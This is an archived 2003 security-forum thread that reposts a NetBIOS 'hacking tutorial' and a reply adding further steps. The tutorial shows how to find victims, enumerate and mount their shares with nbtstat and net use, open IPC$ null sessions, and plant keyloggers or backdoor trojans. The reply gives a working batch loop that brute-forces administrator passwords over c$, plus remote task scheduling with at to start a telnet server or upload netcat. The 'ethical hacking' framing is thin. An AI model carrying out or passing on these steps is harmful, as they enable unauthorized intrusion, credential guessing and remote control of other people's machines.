@@ -1,0 +1,389 @@
+Help - Search - Member List - Calendar Full Version: Netbios Hacking
+GovernmentSecurity.org > The Archives > Exploit Articles
+GSecurAug 18 2003, 05:10 AM
+Posted By: dissolutions
+******************************************************
+NETBIOS BASED HACKING TUTORIAL BY GAURAV KUMAR 
+
+gkverma@msn.com
+******************************************************
+Preface 
+
+Dear reader I have written this tutorial keeping in mind that readers having only the basic knowledge will also be able to know how hackers hack using NetBIOS. Using NetBIOS for hacking is the probably the easiest way to hack remotely. I strongly oppose hacking but not ethical hacking. An ethical hacker is one that hacks computer networks not for anti social reasons but to let the network administrators know about the security holes so that they can prevent their computers from hacking. If you want to contact me please send me a mail to gaurav@sec33.com 
+************************************
+Contents- 
+
+A brief lesson on NetBIOS 
+
+The NBTSTAT command 
+
+What you need to hack ? 
+
+Types of attacks 
+
+Searching for a victim 
+
+Lets Hack - Part 1 Remotely reading/writing to a victim's computer 
+
+Cracking "Share "passwords 
+
+Using IPC$ to hack Windows NT 
+
+Penetrating in to the victim's computer 
+
+Lets Hack - Part 2 Denial of service attack 
+
+How to protect yourself 
+
+________________________________________________________________________________
+_____________________________ 
+
+A BRIEF LESSON ON NETBIOS 
+
+NetBIOS stands for Network Basic Input Output System .It was originally developed by IBM and Sytek as an Application Programming Interface (API) for client software to access LAN resources. If you have experience of working on a LAN using Microsoft Windows Operating Systems (like Windows98 , Windows Me, Windows NT etc), you must have clicked on "Network Neighborhood" to access the computers attached to your network. After clicking on the icon you would have seen the names of the computer . Do you know what exactly happens when you click on Network Neighborhood? Your computer tries to get the names of the computers attached to the network with by issuing command to NetBIOS . NetBIOS gives the name of the computers that have been registered . In short NetBIOS gives the various information of the computers on a network . These Include- 
+
+Name of the computer 
+
+Username 
+
+Domain 
+
+Computer Name 
+
+and many others. 
+
+Like any other service it also works on a port . It has been assigned a port number 139. 
+
+________________________________________________________________________________
+______________________________ 
+
+THE NBTSTAT COMMAND 
+
+You can manually interact with the NetBIOS with the help of NBTSTAT command. To use this command click on the start button then select RUN... and type "command" without quotes to launch MS-DOS Command Prompt. Alternatively you may click on Start Button then go to Programs and then select Command Prompt. Once you are in Command Prompt you can exit by typing command EXIT . To launch Command Prompt in full screen mode press ALT+ENTER key combination .To get back to the original window again press ALT+ENTER key combination. If you have launched the command prompt you will get 
+
+c:\windows> 
+
+If you do not get windows displayed after c:\ don't worry just keep going , all required commands will work fine. 
+
+Now lets play with the NBTSTAT command. 
+
+If you want to get more help from MS-DOS about this command type NBTSTAT/? on the prompt i.e. 
+
+c:\windows>nbtstat/? 
+
+If you want to get the NetBIOS information of your computer type the following command 
+
+c:\windows>nbtstat -a 127.0.0.1 
+
+This command will list the NetBIOS information. A typical example 
+
+NetBIOS Remote Machine Name Table 
+
+Name Number Type Usage 
+
+========================================================================== 
+
+workgroup 00 G Domain Name 
+
+my_computer 03 U Messenger Service 
+
+myusername 03 U Messenger Service 
+
+
+MAC Address = 00-02-44-14-23-E6 
+
+
+
+Please note that we have used our ip address to be 127.0.0.1 . This ip address is called as "Loop Back" ip address because this ip address always refers to the computer you are using. 
+
+This example is self explanatory . We need not go in details. We need to know about the Name and Number. The Name displays the Name of the NetBIOS and there is a corresponding hexagonal number . You may see some additional names in your case. 
+
+If you want to get the NetBIOS names of a remote computer, the command is 
+
+c:\windows>nbtstat -a ipaddress 
+
+Example - To get the NetBIOS names of a computer having ip address 203.195.136.156, we shall use the command 
+
+NOTE-203.195.136.156 may be a active ip address of someone's computer. I am using it only as an example. Please don't hack this computer. 
+
+c:\windows>nbtstat -a 203.195.136.156 
+
+If you want to get to know more about the ip address and ports click here 
+
+
+
+________________________________________________________________________________
+____ 
+
+WHAT YOU NEED TO HACK 
+
+All you need is a Windows based operating system like Windows 98 and Me (but I prefer Windows NT, 2000, XP) and an internet connection. 
+
+
+________________________________________________________________________________
+____________________________ 
+
+
+
+TYPES OF ATTACKS 
+
+We can launch two types of attack on the remote computer having NetBIOS. 
+
+1. Reading/Writing to a remote computer system 
+
+2. Denial of Service 
+
+
+
+________________________________________________________________________________
+_____________________________ 
+
+Searching for a victim 
+
+You may manually search for the victims by first using the nbtstat -a ipaddress and then net view \\ipaddress . If at first you don't succeed step to next ip address until you find a suitable ip address. You may also use a port scanner .A port scanner is simply a software that can search for any block of ip address say 192.168.0.1 to 192.168.0.255 for one or more ports. "Orge" is a port scanner that gives NetBIOS names of the remote computer. 
+
+
+
+________________________________________________________________________________
+____________________________ 
+
+Lets Hack -Part 1 Remotely reading/writing to a victim's computer 
+
+Believe it or not but NetBIOS is the easiest method to break into somebody's computer. However there is a condition that must be satisfied before you can hack. The condition is that the victim must have enabled File And Printer Sharing on his computer. If the victim has enabled it , the nbtstat command will display one more NetBIOS name. Now lets us take a example. Suppose you know a ip address that has enabled File And Printer Sharing and let suppose the ip address happens to be 203.195.136.156 . 
+
+If you would like to know more about ip address click here . If you don't the ip address where File and Printer Sharing is enabled read "Searching for a victim" 
+
+The command that you will use to view the NetBIOS name is 
+
+c:\windows>nbtstat -a 203.195.136.156 
+
+Let suppose that the output comes out to be 
+
+NetBIOS Remote Machine Name Table 
+
+Name Type Status 
+------------------------------------------------------------------------------------------------- 
+user <00> UNIQUE Registered 
+workgroup <00> GROUP Registered 
+user <03> UNIQUE Registered 
+user <20> UNIQUE Registered 
+
+
+MAC Address = 00-02-44-14-23-E6 
+
+
+
+The number <20> shows that the victim has enabled the File And Printer Sharing. 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------- 
+
+NOTE - If you do not get this number there are two possibilities 
+
+1. You do not get the number <20> . This shows that the victim has not enabled the File And Printer Sharing . 
+
+2. You get "Host Not found" . This shows that the port 139 is closed or the ip address doesn't exists. 
+
+--------------------------------------------------------------------------------------------------------- 
+
+Now our next step would be to view the drive or folders the victim is sharing. 
+
+We will use command 
+
+c:\windows>net view \\203.195.136.156 
+
+Let suppose we get the following output 
+
+Shared resources at \\203.195.136.156 
+ComputerNameGoesHere 
+
+Share name Type Used as Comment 
+
+----------------------------------------------------------------------------------------------- 
+CDISK Disk 
+
+
+The command completed successfully. 
+
+
+
+"DISK" shows that the victim is sharing a Disk named as CDISK . You may also get some additional information like 
+
+
+
+Shared resources at \\203.195.136.156 
+
+
+ComputerNameGoesHere 
+
+Share name Type Used as Comment 
+
+----------------------------------------------------------------------------------------------- 
+HP-6L Print 
+
+
+"Print " shows that the victim is sharing a printer named as HP-6L 
+
+If we are able to share the victims hard disks or folders or printers we will be able to read write to the folders or hard disks or we may also be able to print anything on a remote printer ! Now let us share the victims computer's hard disk or printer. 
+
+Till now we know that there is a computer whose ip address happens to be 203.195.136.156 and on that computer File and printer sharing is enabled and the victim's hard disk 's name is CDISK. 
+
+Now we will connect our computer to that hard disk . After we have connected successfully a drive will be created on our computer and on double clicking on it we will be able to view the contents of the drive. If we have connected our newly formed drive to the victim's share name CDISK it means that we our drive will have the same contents as that of the CDISK . 
+
+Lets do it. 
+
+We will use the NET command to do our work . 
+
+Let suppose we want to make a drive k: on our computer and connect it to victim's share we will issue the command 
+
+c:\windows>net use k: \\203.195.136.156\CDISK 
+
+You may replace k letter by any other letter. 
+
+If the command is successful we will get the confirmation - The command was completed successfullly 
+
+The command was completed successfully 
+
+Now just double click on the My Computer icon on your desktop and you will be a happy hacker! 
+
+We have just crested a new drive k: . Just double click on it and you will find that you are able to access the remote computer's hard disk. Enjoy your first hack! 
+
+GO TO CONTENTS 
+
+________________________________________________________________________________
+_____________________________ 
+
+Cracking Share passwords 
+
+Sometimes when we use "net use k: \\ipaddress\sharename" we are asked for a password. There is a password cracker "PQWAK" . All you have to enter ip address and the share name and it will decrypt the password within seconds. Please note that this can crack only the passwords is the remote operating system is running on - 
+
+Windows 95 
+
+Windows 98 
+
+Windows Me 
+
+GO TO CONTENTS 
+
+________________________________________________________________________________
+______________________________ 
+
+Using IPC$ to hack Windows NT,2000,XP 
+
+Now you must be thinking of something that can crack share passwords on NT based operating systems like Windows NT and Windows 2000. 
+
+IPC$ is there to help us. It is not at all a password cracker . It is simply a string that tells the remote operating system to give guest access that is give access without asking for password. 
+
+We hackers use IPC$ in this way 
+
+c:\windows>net use k: \\123.123.123.123\ipc$ "" /user:"" 
+
+You may replace k letter by any other letter. If you replace it by "b" (type without quotes) a new drive will be created by a drive letter b. 
+
+Please note that you won't be able to get access to victim's shared drives but you you can gather valuable information like names of all the usernames, users that have never logged, and other such information. One such tool that uses the ipc$ method is "Internet Periscope". Another tool is "enum" - its my favorite toot however it is run on command promt. 
+
+GO TO CONTENTS 
+
+________________________________________________________________________________
+______________________________ 
+
+
+Penetrating in to the victim's computer 
+
+Now that you have access to a remote computer you may be interested in viewing his secret emails, download hismp3 songs , and more... 
+
+But if you think like a hard core hacker you would like to play some dirty tricks like you may wish to install a key logger or install a back door entry Trojan like netbus and backorifice or delete or copy some files. All these tasks involves writing to victim's hard disk . For this you need to have write access permission. 
+
+GO TO CONTENTS 
+
+________________________________________________________________________________
+_____________________________ 
+
+Lets Hack - Part 2 Denial of service attack 
+
+
+This type of attacks are meant to be launched by some computer techies because this type of attack involves using Linux Operating System and compiling C language files. To exploit these vulnerabilities you have to copy exploit code from sites like neworder,securityfocus etc and comiple them. 
+
+The two most common vulnerabilities found in NetBIOS are 
+
+Vulnerability 1 
+
+Vulnerability 2 
+
+Another vulnerability that has been foud recently is that one can launch a DoS attack against winodws NT,2000,XP,.NET system. For detailed information and pacth plz visit this link http://www.microsoft.com/technet/treeview/...in/MS02-045.asp. 
+I have checked my web servers that are still vulnerable to this type of attack. 
+
+
+
+________________________________________________________________________________
+______________________________ 
+
+How to protect yourself 
+
+Please visit windowsupdate.microsoft.com and let the windows update itself. 
+
+________________________________________________________________________________
+______________________________ 
+
+The above tutorial has been written by Gaurav Kumar 
+
+If you need more help please feel free to email me gkverma@msn.com 
+
+
+
+http://www.mycgiserver.com/~ethicalhackers...rs/netbios.html 
+0*************************************************************
+
+GSecurAug 18 2003, 05:13 AM
+Additional Information Added by: GAN_GR33N
+
+alot of people talk smack about netbios hacking but i do sec audits for isp's and it's sad 2 say but this is a common hole. i think the main thing that people don't teach about netbios is the fact that you can compromise the entire system and even gain telnet access if u know what 2 do making this a vicios attack when done right.
+
+i guess i would be a putts if i didn't throw in some examples at this point so here goes
+
+using enum.exe and cis scanner it is easy as hell to grab all local user account names from a system with netbios enabled. these are easy to find so just search google or something. cis scanner makes a really nice report like this
+
+Account Name :DavidF
+The DavidF account is an ADMINISTRATOR, and the password was
+changed 5 days ago. This account has been used 15 times to logon.
+
+Comment :
+User Comment :
+Full name :David xxxxxxx
+
+
+Account Name :Guest
+The Guest account is a GUEST, and the password was
+changed 0 days ago. This account has been used 0 times to logon.
+
+
+Account Name :IUSR_FTP_VAL
+The IUSR_FTP_VAL account is a GUEST, and the password was
+changed 5 days ago. This account has been used 0 times to logon.
+
+Comment :ID added for anonymous FTP
+User Comment :
+Full name :FTP Internet Guest Account
+
+as u can see from this their is one admin account named davidf and that there is an anon ftp running. from this point you can try to find stuff like test accounts with admin privs and names like "test and backup" or you can try 2 bruteforce the admin account withthis command line script for ms-dos { for /f "tokens=1" %p in (pass.txt) do net use x: \\ipaddress\c$ %p /u:ipaddress\davidf } without the brackets and put a file in the same dir named pass.txt formated like this
+
+secret
+password
+sexy
+12345
+
+and it will begin to try to guess the password. if you start to see the message "network device is allready in use" smoke em if u got em because your in. 
+
+the next step it to gain command line control using the scheduler the syntax here is
+
+"at \\ipaddress"
+hopefully u will get 
+"there no entries in the list"
+then do a "net time \\ipaddress"
+to get the time and try to schedule a task for 5 mins later like
+at \\ipaddress 10:35P ""net start tlntsvr""
+this will open telnet server on the target server or you could upload netcat or wsremote r other ways of getting command line access.
+
+
+
+This is a "lo-fi" version of our main content. To view the full version with more information, formatting and images, please click here.
+Invision Power Board © 2001-2005 Invision Power Services, Inc.
